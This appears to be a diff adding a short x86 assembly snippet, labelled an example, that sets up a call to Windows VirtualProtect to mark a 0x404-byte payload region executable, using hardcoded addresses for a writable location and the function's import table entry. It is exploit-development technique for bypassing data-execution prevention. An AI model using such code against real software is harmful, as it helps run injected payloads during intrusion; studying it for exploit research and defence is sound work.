@@ -1,0 +1,17 @@
+example to call VirtualProtect
+
+match:
+    push 0x61f8c008 ; any writable address
+    xor eax, eax
+    mov al, 0x40
+    push eax
+    mov eax, 0xfffffbfc
+    neg eax 
+    push eax  ; 0x404 length of the payload
+    push edi
+    push edi
+    mov ebx, 0x69aa7ea4      ; IAT of VirtualProtect
+    mov eax, dword ptr [ebx]
+    xor ebx, ebx
+    push eax
+    ret
